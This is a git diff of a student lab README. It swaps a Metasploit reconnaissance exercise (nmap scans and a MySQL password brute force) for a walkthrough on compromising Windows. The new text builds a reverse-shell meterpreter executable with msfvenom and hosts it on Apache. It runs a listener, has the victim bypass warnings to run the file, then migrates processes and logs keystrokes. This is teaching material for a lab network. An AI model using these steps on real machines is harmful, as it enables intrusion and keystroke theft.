@@ -1,10 +1,11 @@
-# Metasploit-for-reconnaissance
+# Compromising-windows-using-Metasploit
+Compromising windows using Metasploit
 # Metasploit
-Metasploit for reconnaissance in pentesting
+Compromising windows using Metasploit
 
 # AIM:
 
-To get introduced to Metasploit Framework and to  perform reconnaissance  in pentesting .
+To Compromise windows using Metasploit .
 
 ## DESIGN STEPS:
 
@@ -21,74 +22,97 @@ Investigate on the various categories of tools as follows:
 Open terminal and try execute some kali linux commands
 
 ## PROGRAM:
-Find out the ip address of the attackers system
+
+Find the attackers ip address using ifconfig
+## OUTPUT:
+![s](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/d9b9e488-6580-4969-a3d2-5061443c0ed1)
 
 
+
+Create a malicious executable file fun.exe using msenom command
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
+## OUTPUT
+![1](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/12b58fda-5cec-4e47-872b-b838ef920d46)
+
+
+
+
+copy the fun.exe into the apache /var/www/html folder
+![2](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/37d7e507-5d47-4ddb-ba93-586f6d73a51b)
+
+
+Start apache server
+sudo systemctl apache2 start
+
+![3](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/0d0224f9-d80c-42b9-a3ab-09b48da66a27)
+
+
+
+Check the status of apache2
+![4](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/77516604-9c4f-4317-a188-c41de4625542)
+
+
+
+Invoke msfconsole:
 ## OUTPUT:
 
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/1f538f40-f876-4459-8677-8dfbac405ba8)
 
-## Invoke msfconsole:
-## OUTPUT:
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/953379bc-27c4-4e87-9702-3316dfb7c3ef)
+
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
-## OUTPUT:
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/7f276d8f-8564-47aa-be92-6777dd9474db)
 
-Port Scanning: Following command is executed for scanning the systems on our local area network with a TCP scan (-sT) looking for open ports between 1 and 1000 (-p1-1000). msf > nmap -sT 192.168.1810/24 -p1-1000
 
-## OUTPUT:
+Starting a command and control Server
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+exploit
+![6](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/938f78c9-0e8a-42ef-847c-a7cee7393beb)
 
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/c0cf7ce9-74cc-4c75-8e07-dd3785c52086)
 
- ## Step4: use the db-nmap command to scan and save the results into Metasploit's postgresql attached database. In that way, you can use those results in the exploitation stage later.
 
-scan the targets with the command db_nmap as follows. msf > db_nmap 192.168.181.0/24
+On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
+http://192.168.1.2/fun.exe
+The file "fun.exe" downloads. 
+![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/4cf82361-ac00-46ab-92a2-3f09592d98d5)
 
-## OUTPUT:
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/c3e81fb0-1f4d-4243-b8b0-8886a01ee24e)
 
-Metasploit has a multitude of scanning modules built in. If we open another terminal, we can navigate to Metasploit's auxiliary modules and list all the scanner modules. cd /usr/share /metasploit-framework/modules/auxiliary kali > ls -l
+Bypass any warning boxes, double-click the file, and allow it to run.
 
-## OUTPUT:
+On kali give the command exploit
+![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/fee0700e-bafd-4e76-af72-f5ac23a5d6ba)
 
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/99aca0dd-3fd0-4380-904c-773475effa74)
 
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/0cb3f03c-c4c4-4b80-96b7-fdd4b3645f8b)
+To see a list of processes, at the meterpreter > prompt, execute this command:
+ps  ⇒ can see the fun.exe process running with pid 1156
 
-Search is a powerful command in Metasploit that you can use to find what you want to locate. msf >search name:Microsoft type:exploit
+The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
+To become more persistent, we'll migrate to a process that will last longer.
+Let's migrate to the winlogon process.
+At the meterpreter > prompt, execute this command:
 
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/616d4518-88b6-4b8f-80eb-c0c6e16df08a)
+migrate -N explorer.exe
+at meterpreter > prompt, execute this command:
+netstat
+A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
+Notice the "PID/Program name" value for this connection, which is redacted 
+![ss](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/b2d36ca1-64a2-4863-a648-4ef4a8727dd9)
 
-The info command provides information regarding a module or platform
-## OUTPUT:
 
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/09a5a034-e2b2-4100-a600-2994f2892c99)
 
-Before beginning, set up the Metasploit database by starting the PostgreSQL server and initialize msfconsole database as follows: systemctl start postgresql msfdb init ##MYSQL ENUMERATION Find the IP address of the Metasploitable machine first. Then, use the db_nmap command in msfconsole with Nmap flags to scan the MySQL database at 3306 port. db_nmap -sV -sC -p 3306 <metasploitable_ip_address>
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/4357ed6f-62a5-4adb-ad5c-fee8dffdfd7b)
+Post Exploitation
+The target is now owned. Following are meterpreter commands for key capturing in the target machine
+keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
+![9](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/85fb473c-59fe-4042-b163-552fddc735d1)
 
-Use the search option to look for an auxiliary module to scan and enumerate the MySQL database. search type:auxiliary mysql
 
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/5dd2edca-fd00-45b3-956e-8dd5fe41465a)
 
-use the auxiliary/scanner/mysql/mysql_version module by typing the module name or associated number to scan MySQL version details. use 11 Or: use auxiliary/scanner/mysql/mysql_version
+keyscan_dump	Shows the keystrokes captured so far
+![10](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/785ef849-9095-4065-b38a-54b544a0c440)
 
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/8f9525da-1a5b-4498-8f41-8ef701adb2d9)
 
-Use the set rhosts command to set the parameter and run the module, as follows:
 
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/57882379-ea28-4349-a3dc-ecea7bb10dea)
-
-After scanning, you can also brute force MySQL root account via Metasploit's auxiliary(scanner/mysql/mysql_login) module.
-
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/7234a9cb-8baf-485c-b743-f6c6250dded8)
-
-set the PASS_FILE parameter to the wordlist path available inside /usr/share/wordlists: set PASS_FILE /usr/share/wordlistss/rockyou.txt Then, specify the IP address of the target machine with the RHOSTS command. set RHOSTS Set BLANK_PASSWORDS to true in case there is no password set for the root account. set BLANK_PASSWORDS true
-
-![image](https://github.com/gokul-sureshkumar/Metasploit-for-reconnaissance/assets/121148715/752e39b3-a594-4e46-b60e-1bb7a0ff9d5d)
 
 
 ## RESULT:
-The Metasploit framework for reconnaissance is  examined successfully
+The Metasploit framework is  used to compromise windows and is examined successfully.
